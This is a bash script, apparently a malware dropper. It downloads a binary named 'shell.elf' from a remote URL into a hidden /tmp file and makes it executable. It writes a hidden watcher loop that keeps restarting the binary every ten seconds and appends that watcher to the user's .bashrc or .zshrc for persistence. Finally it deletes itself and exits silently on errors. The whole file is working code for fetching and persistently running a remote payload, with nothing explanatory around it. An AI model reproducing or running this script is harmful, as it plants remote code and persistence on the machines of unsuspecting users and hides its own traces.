#!/bin/bash

SHELL_URL="https://raw.githubusercontent.com/sys64x/sys/shell.elf"
SHELL_PATH="/tmp/.shell.elf"
WATCHER_PATH="/tmp/.shell_watcher.sh"

AUTOSTART_CMD="$WATCHER_PATH &"
BASHRC="$HOME/.bashrc"
ZSHRC="$HOME/.zshrc"

silent_exit() {
  exit 1
}

command -v curl >/dev/null 2>&1 || silent_exit

curl -fsSL "$SHELL_URL" -o "$SHELL_PATH" || silent_exit
chmod +x "$SHELL_PATH" || silent_exit

cat > "$WATCHER_PATH" << 'EOF'
#!/bin/bash
SHELL="/tmp/.shell.elf"

while true; do
  if ! pgrep -f "$SHELL" > /dev/null; then
    "$SHELL" &
  fi
  sleep 10
done
EOF

chmod +x "$WATCHER_PATH" || silent_exit

add_autostart() {
  local rcfile="$1"
  if [ -f "$rcfile" ]; then
    grep -qxF "$AUTOSTART_CMD" "$rcfile" || echo "$AUTOSTART_CMD" >> "$rcfile"
  else
    echo "$AUTOSTART_CMD" > "$rcfile"
  fi
}

SHELL_NAME=$(basename "$SHELL")

case "$SHELL_NAME" in
  bash)
    add_autostart "$BASHRC"
    ;;
  zsh)
    add_autostart "$ZSHRC"
    ;;
  *)
    add_autostart "$BASHRC"
    ;;
esac

"$WATCHER_PATH" &

rm -- "$0" 2>/dev/null

exit 0

